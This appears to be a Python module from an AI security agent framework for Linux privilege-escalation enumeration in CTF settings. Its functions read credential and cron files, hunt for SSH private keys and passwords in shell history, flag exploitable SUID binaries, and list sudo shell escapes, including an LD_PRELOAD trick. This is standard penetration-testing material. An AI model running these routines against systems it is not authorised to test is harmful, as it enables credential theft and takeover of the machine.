"""
Linux Privilege Escalation Toolkit for CAI

This module provides comprehensive Linux privilege escalation tools including
automated enumeration, vulnerability detection, and exploit suggestions.
"""

import os
import re
import subprocess
import time
import json
from typing import Dict, List, Tuple, Optional, Any
from cai.tools.common import run_command


def automated_privesc_scan(ctf=None, **kwargs) -> str:
    """
    Perform comprehensive automated Linux privilege escalation enumeration
    
    Returns:
        str: Detailed enumeration results with privilege escalation opportunities
    """
    results = []
    results.append("=== Linux Privilege Escalation Enumeration ===")
    results.append(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    results.append("")

    try:
        # System Information
        results.append("=== System Information ===")
        sys_info = enumerate_system_info(ctf=ctf)
        results.append(sys_info)
        results.append("")

        # User Information
        results.append("=== User Information ===")
        user_info = enumerate_user_info(ctf=ctf)
        results.append(user_info)
        results.append("")

        # SUID/SGID Files
        results.append("=== SUID/SGID Files ===")
        suid_info = find_suid_sgid_files(ctf=ctf)
        results.append(suid_info)
        results.append("")

        # Writable Directories
        results.append("=== Writable Directories ===")
        writable_info = find_writable_directories(ctf=ctf)
        results.append(writable_info)
        results.append("")

        # Interesting Files
        results.append("=== Interesting Files ===")
        files_info = find_interesting_files(ctf=ctf)
        results.append(files_info)
        results.append("")

        # Network Information
        results.append("=== Network Information ===")
        network_info = enumerate_network_info(ctf=ctf)
        results.append(network_info)
        results.append("")

        # Process Information
        results.append("=== Process Information ===")
        process_info = enumerate_processes(ctf=ctf)
        results.append(process_info)
        results.append("")

        # Services and Cron Jobs
        results.append("=== Services and Scheduled Tasks ===")
        services_info = enumerate_services_cron(ctf=ctf)
        results.append(services_info)
        results.append("")

        # Kernel Exploits
        results.append("=== Kernel Exploit Suggestions ===")
        kernel_info = suggest_kernel_exploits(ctf=ctf)
        results.append(kernel_info)
        results.append("")

        return "\n".join(results)

    except Exception as e:
        return f"Error during privilege escalation scan: {str(e)}"


def enumerate_system_info(ctf=None, **kwargs) -> str:
    """Enumerate basic system information"""
    results = []

    try:
        # Basic system info
        hostname = run_command("hostname", ctf=ctf).strip()
        results.append(f"Hostname: {hostname}")

        # OS information
        os_info = run_command("cat /etc/os-release 2>/dev/null || cat /etc/issue", ctf=ctf)
        results.append(f"OS Information:\n{os_info}")

        # Kernel version
        kernel = run_command("uname -a", ctf=ctf).strip()
        results.append(f"Kernel: {kernel}")

        # Architecture
        arch = run_command("uname -m", ctf=ctf).strip()
        results.append(f"Architecture: {arch}")

        # CPU info
        cpu_info = run_command("cat /proc/cpuinfo | grep 'model name' | head -1", ctf=ctf)
        if cpu_info.strip():
            results.append(f"CPU: {cpu_info.strip()}")

        # Memory info
        mem_info = run_command("free -h", ctf=ctf)
        results.append(f"Memory:\n{mem_info}")

        # Disk usage
        disk_info = run_command("df -h", ctf=ctf)
        results.append(f"Disk Usage:\n{disk_info}")

    except Exception as e:
        results.append(f"Error enumerating system info: {str(e)}")

    return "\n".join(results)


def enumerate_user_info(ctf=None, **kwargs) -> str:
    """Enumerate user and group information"""
    results = []

    try:
        # Current user
        current_user = run_command("whoami", ctf=ctf).strip()
        results.append(f"Current User: {current_user}")

        # User ID
        user_id = run_command("id", ctf=ctf).strip()
        results.append(f"User ID: {user_id}")

        # Groups
        groups = run_command("groups", ctf=ctf).strip()
        results.append(f"Groups: {groups}")

        # Sudo privileges
        sudo_info = run_command("sudo -l 2>/dev/null", ctf=ctf)
        if sudo_info.strip() and "not allowed" not in sudo_info.lower():
            results.append(f"Sudo Privileges:\n{sudo_info}")
        else:
            results.append("Sudo Privileges: None or not accessible")

        # Check for password-less sudo
        sudo_nopass = run_command(
            "sudo -n true 2>/dev/null && echo 'NOPASSWD sudo available' || echo 'Password required for sudo'", ctf=ctf)
        results.append(f"Password-less sudo: {sudo_nopass.strip()}")

        # Users with login shells
        users = run_command("cat /etc/passwd | grep -E '/bin/(bash|sh|zsh|fish)' | cut -d: -f1", ctf=ctf)
        results.append(f"Users with login shells:\n{users}")

        # Home directories
        home_dirs = run_command("ls -la /home/", ctf=ctf)
        results.append(f"Home directories:\n{home_dirs}")

        # SSH keys
        ssh_keys = run_command("find /home -name '*.pub' -o -name 'id_*' -o -name 'authorized_keys' 2>/dev/null",
                               ctf=ctf)
        if ssh_keys.strip():
            results.append(f"SSH Keys found:\n{ssh_keys}")

    except Exception as e:
        results.append(f"Error enumerating user info: {str(e)}")

    return "\n".join(results)


def find_suid_sgid_files(ctf=None, **kwargs) -> str:
    """Find SUID and SGID files for potential privilege escalation"""
    results = []

    try:
        # Find SUID files
        suid_files = run_command("find / -type f -perm -4000 2>/dev/null", ctf=ctf)
        results.append("SUID Files:")
        if suid_files.strip():
            # Check for interesting SUID binaries
            interesting_suid = []
            suid_list = suid_files.strip().split('\n')

            dangerous_suid = [
                'nmap', 'vim', 'nano', 'less', 'more', 'cp', 'mv', 'find', 'awk',
                'python', 'perl', 'ruby', 'lua', 'node', 'php', 'gcc', 'make',
                'tar', 'zip', 'unzip', 'gzip', 'git', 'ftp', 'socat', 'strace',
                'tcpdump', 'wireshark', 'gdb', 'valgrind', 'docker'
            ]

            for suid_file in suid_list:
                if suid_file.strip():
                    file_name = os.path.basename(suid_file)
                    if any(dangerous in file_name for dangerous in dangerous_suid):
                        interesting_suid.append(f"⚠️  {suid_file} (POTENTIALLY EXPLOITABLE)")
                    else:
                        results.append(f"   {suid_file}")

            if interesting_suid:
                results.append("\n🔥 INTERESTING SUID FILES:")
                results.extend(interesting_suid)
        else:
            results.append("   No SUID files found")

        # Find SGID files
        sgid_files = run_command("find / -type f -perm -2000 2>/dev/null", ctf=ctf)
        results.append("\nSGID Files:")
        if sgid_files.strip():
            results.append(sgid_files)
        else:
            results.append("   No SGID files found")

        # Check for world-writable SUID/SGID files
        writable_suid = run_command("find / -type f \\( -perm -4000 -o -perm -2000 \\) -writable 2>/dev/null", ctf=ctf)
        if writable_suid.strip():
            results.append(f"\n🚨 WORLD-WRITABLE SUID/SGID FILES:\n{writable_suid}")

    except Exception as e:
        results.append(f"Error finding SUID/SGID files: {str(e)}")

    return "\n".join(results)


def find_writable_directories(ctf=None, **kwargs) -> str:
    """Find world-writable directories"""
    results = []

    try:
        # World-writable directories
        writable_dirs = run_command("find / -type d -writable 2>/dev/null | grep -v proc | head -20", ctf=ctf)
        results.append("World-writable directories:")
        if writable_dirs.strip():
            results.append(writable_dirs)

            # Check if any writable directories are in PATH
            path_dirs = run_command("echo $PATH", ctf=ctf).strip().split(':')
            writable_list = writable_dirs.strip().split('\n')

            path_writable = []
            for writable_dir in writable_list:
                if writable_dir.strip() in path_dirs:
                    path_writable.append(writable_dir.strip())

            if path_writable:
                results.append(f"\n🔥 WRITABLE DIRECTORIES IN PATH:\n" + '\n'.join(path_writable))
        else:
            results.append("   No world-writable directories found")

        # Check /tmp and /var/tmp permissions
        tmp_perms = run_command("ls -ld /tmp /var/tmp 2>/dev/null", ctf=ctf)
        if tmp_perms.strip():
            results.append(f"\nTemp directory permissions:\n{tmp_perms}")

    except Exception as e:
        results.append(f"Error finding writable directories: {str(e)}")

    return "\n".join(results)


def find_interesting_files(ctf=None, **kwargs) -> str:
    """Find interesting files that might contain sensitive information"""
    results = []

    try:
        # Configuration files
        config_files = run_command(
            "find /etc -type f -readable 2>/dev/null | grep -E '\\.(conf|config|cfg|ini)$' | head -10", ctf=ctf)
        if config_files.strip():
            results.append("Readable configuration files:")
            results.append(config_files)

        # Database files
        db_files = run_command("find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null | head -10",
                               ctf=ctf)
        if db_files.strip():
            results.append(f"\nDatabase files:\n{db_files}")

        # Log files
        log_files = run_command("find /var/log -type f -readable 2>/dev/null | head -10", ctf=ctf)
        if log_files.strip():
            results.append(f"\nReadable log files:\n{log_files}")

        # Backup files
        backup_files = run_command(
            "find / -name '*.bak' -o -name '*.backup' -o -name '*.old' -o -name '*.orig' 2>/dev/null | head -10",
            ctf=ctf)
        if backup_files.strip():
            results.append(f"\nBackup files:\n{backup_files}")

        # Password files
        password_files = run_command("find / -name '*password*' -o -name '*passwd*' 2>/dev/null | head -10", ctf=ctf)
        if password_files.strip():
            results.append(f"\nPassword-related files:\n{password_files}")

        # Check for passwords in history files
        history_files = run_command("find /home -name '.*history' 2>/dev/null", ctf=ctf)
        if history_files.strip():
            results.append(f"\nHistory files (check for passwords):\n{history_files}")

            # Look for passwords in bash history
            password_history = run_command("grep -r -i 'password\\|passwd' /home/*/.bash_history 2>/dev/null | head -5",
                                           ctf=ctf)
            if password_history.strip():
                results.append(f"\n🔥 PASSWORDS IN HISTORY:\n{password_history}")

        # Check for SSH keys and config
        ssh_files = run_command(
            "find / -name 'id_*' -o -name '*.pub' -o -name 'known_hosts' -o -name 'authorized_keys' 2>/dev/null",
            ctf=ctf)
        if ssh_files.strip():
            results.append(f"\nSSH-related files:\n{ssh_files}")

    except Exception as e:
        results.append(f"Error finding interesting files: {str(e)}")

    return "\n".join(results)


def enumerate_network_info(ctf=None, **kwargs) -> str:
    """Enumerate network information"""
    results = []

    try:
        # Network interfaces
        interfaces = run_command("ip addr show 2>/dev/null || ifconfig", ctf=ctf)
        results.append(f"Network interfaces:\n{interfaces}")

        # Routing table
        routes = run_command("ip route 2>/dev/null || route -n", ctf=ctf)
        results.append(f"\nRouting table:\n{routes}")

        # Listening ports
        listening = run_command("netstat -tulpn 2>/dev/null || ss -tulpn", ctf=ctf)
        results.append(f"\nListening ports:\n{listening}")

        # ARP table
        arp_table = run_command("arp -a 2>/dev/null || ip neigh", ctf=ctf)
        if arp_table.strip():
            results.append(f"\nARP table:\n{arp_table}")

        # Check for internal services
        internal_services = run_command("netstat -ant 2>/dev/null | grep LISTEN | grep '127.0.0.1'", ctf=ctf)
        if internal_services.strip():
            results.append(f"\n🔍 INTERNAL SERVICES:\n{internal_services}")

    except Exception as e:
        results.append(f"Error enumerating network info: {str(e)}")

    return "\n".join(results)


def enumerate_processes(ctf=None, **kwargs) -> str:
    """Enumerate running processes"""
    results = []

    try:
        # All processes
        processes = run_command("ps aux", ctf=ctf)
        results.append("Running processes:")

        # Look for interesting processes
        interesting_procs = []
        proc_lines = processes.split('\n')

        interesting_keywords = [
            'root', 'mysql', 'apache', 'nginx', 'ssh', 'ftp', 'telnet',
            'docker', 'postgres', 'mongodb', 'redis', 'memcached'
        ]

        for line in proc_lines:
            if any(keyword in line.lower() for keyword in interesting_keywords):
                interesting_procs.append(line)

        if interesting_procs:
            results.append("\n🔍 INTERESTING PROCESSES:")
            results.extend(interesting_procs[:10])  # Show first 10

        # Processes running as root
        root_procs = run_command("ps aux | grep '^root' | head -10", ctf=ctf)
        if root_procs.strip():
            results.append(f"\n🔥 PROCESSES RUNNING AS ROOT:\n{root_procs}")

    except Exception as e:
        results.append(f"Error enumerating processes: {str(e)}")

    return "\n".join(results)


def enumerate_services_cron(ctf=None, **kwargs) -> str:
    """Enumerate services and cron jobs"""
    results = []

    try:
        # System services
        services = run_command("systemctl list-units --type=service --state=running 2>/dev/null | head -15", ctf=ctf)
        if services.strip():
            results.append(f"Running services:\n{services}")

        # Cron jobs
        cron_jobs = run_command("crontab -l 2>/dev/null", ctf=ctf)
        if cron_jobs.strip() and "no crontab" not in cron_jobs.lower():
            results.append(f"\nUser cron jobs:\n{cron_jobs}")

        # System cron jobs
        sys_cron = run_command("cat /etc/crontab 2>/dev/null", ctf=ctf)
        if sys_cron.strip():
            results.append(f"\nSystem cron jobs:\n{sys_cron}")

        # Cron directories
        cron_dirs = run_command("ls -la /etc/cron* 2>/dev/null", ctf=ctf)
        if cron_dirs.strip():
            results.append(f"\nCron directories:\n{cron_dirs}")

        # Check for writable cron files
        writable_cron = run_command("find /etc/cron* -writable 2>/dev/null", ctf=ctf)
        if writable_cron.strip():
            results.append(f"\n🔥 WRITABLE CRON FILES:\n{writable_cron}")

    except Exception as e:
        results.append(f"Error enumerating services/cron: {str(e)}")

    return "\n".join(results)


def suggest_kernel_exploits(ctf=None, **kwargs) -> str:
    """Suggest potential kernel exploits based on kernel version"""
    results = []

    try:
        kernel_info = run_command("uname -r", ctf=ctf).strip()
        results.append(f"Kernel version: {kernel_info}")

        # Known kernel exploits (simplified database)
        kernel_exploits = {
            "2.6.": ["DirtyCow (CVE-2016-5195)", "RDS (CVE-2010-3904)", "Vmsplice (CVE-2008-0600)"],
            "3.": ["DirtyCow (CVE-2016-5195)", "Overlayfs (CVE-2015-1328)", "PP_KEY (CVE-2016-0728)"],
            "4.": ["DirtyCow (CVE-2016-5195)", "AF_PACKET (CVE-2017-7308)", "DCCP (CVE-2017-6074)"],
            "5.": ["PwnKit (CVE-2021-4034)", "Sequoia (CVE-2021-33909)", "Baron Samedit (CVE-2021-3156)"]
        }

        suggested_exploits = []
        for version, exploits in kernel_exploits.items():
            if version in kernel_info:
                suggested_exploits.extend(exploits)

        if suggested_exploits:
            results.append("\n🔥 POTENTIAL KERNEL EXPLOITS:")
            for exploit in suggested_exploits:
                results.append(f"   - {exploit}")
        else:
            results.append("\nNo known kernel exploits for this version (or version too new)")

        # Check if system is up to date
        last_update = run_command(
            "stat -c %Y /var/log/dpkg.log 2>/dev/null || stat -c %Y /var/log/yum.log 2>/dev/null || echo 'Unknown'",
            ctf=ctf)
        if last_update.strip() and last_update.strip() != "Unknown":
            try:
                update_time = int(last_update.strip())
                current_time = int(time.time())
                days_since_update = (current_time - update_time) / (24 * 3600)
                results.append(f"\nDays since last package update: {int(days_since_update)}")
                if days_since_update > 30:
                    results.append("⚠️  System may be outdated - check for recent exploits")
            except:
                pass

    except Exception as e:
        results.append(f"Error suggesting kernel exploits: {str(e)}")

    return "\n".join(results)


def exploit_sudo_misconfiguration(command: str, ctf=None, **kwargs) -> str:
    """Attempt to exploit sudo misconfigurations"""
    results = []

    try:
        results.append("=== Sudo Misconfiguration Exploitation ===")

        # Check current sudo privileges
        sudo_list = run_command("sudo -l", ctf=ctf)
        results.append(f"Current sudo privileges:\n{sudo_list}")

        if "NOPASSWD" in sudo_list:
            results.append("\n🔥 NOPASSWD sudo commands found!")

            # Common sudo bypass techniques
            bypass_techniques = [
                f"sudo {command}",
                f"sudo -u root {command}",
                f"sudo env {command}",
                f"sudo LD_PRELOAD=./evil.so {command}"
            ]

            results.append("\nPotential bypass techniques:")
            for technique in bypass_techniques:
                results.append(f"   - {technique}")

        # Check for shell escapes
        dangerous_commands = ['vi', 'vim', 'nano', 'less', 'more', 'man', 'ftp', 'gdb', 'awk', 'find', 'nmap']
        for cmd in dangerous_commands:
            if cmd in sudo_list:
                results.append(f"\n🔥 SHELL ESCAPE POSSIBLE with sudo {cmd}")
                if cmd == 'vi' or cmd == 'vim':
                    results.append("   Escape: :!sh or :shell")
                elif cmd == 'less' or cmd == 'more':
                    results.append("   Escape: !sh")
                elif cmd == 'man':
                    results.append("   Escape: !sh")
                elif cmd == 'ftp':
                    results.append("   Escape: !sh")
                elif cmd == 'gdb':
                    results.append("   Escape: !sh")
                elif cmd == 'awk':
                    results.append("   Escape: awk 'BEGIN {system(\"/bin/sh\")}'")
                elif cmd == 'find':
                    results.append("   Escape: find . -exec /bin/sh \\;")
                elif cmd == 'nmap':
                    results.append("   Escape: nmap --interactive")

    except Exception as e:
        results.append(f"Error exploiting sudo: {str(e)}")

    return "\n".join(results)


def exploit_cron_jobs(ctf=None, **kwargs) -> str:
    """Look for exploitable cron jobs"""
    results = []

    try:
        results.append("=== Cron Job Exploitation ===")

        # Find writable scripts executed by cron
        cron_scripts = run_command("find /etc/cron* /var/spool/cron* -type f -writable 2>/dev/null", ctf=ctf)
        if cron_scripts.strip():
            results.append(f"🔥 WRITABLE CRON SCRIPTS:\n{cron_scripts}")
            results.append("\nYou can modify these scripts to execute arbitrary commands as the cron user!")

        # Check for scripts in writable directories
        writable_dirs = run_command("find / -type d -writable 2>/dev/null | head -10", ctf=ctf)
        if writable_dirs.strip():
            for directory in writable_dirs.strip().split('\n'):
                if directory.strip():
                    scripts_in_dir = run_command(
                        f"find {directory.strip()} -name '*.sh' -o -name '*.py' -o -name '*.pl' 2>/dev/null", ctf=ctf)
                    if scripts_in_dir.strip():
                        results.append(f"\nScripts in writable directory {directory}:\n{scripts_in_dir}")

        # Look for cron jobs running as root
        root_cron = run_command("grep -r 'root' /etc/cron* 2>/dev/null", ctf=ctf)
        if root_cron.strip():
            results.append(f"\nCron jobs running as root:\n{root_cron}")

    except Exception as e:
        results.append(f"Error checking cron jobs: {str(e)}")

    return "\n".join(results)
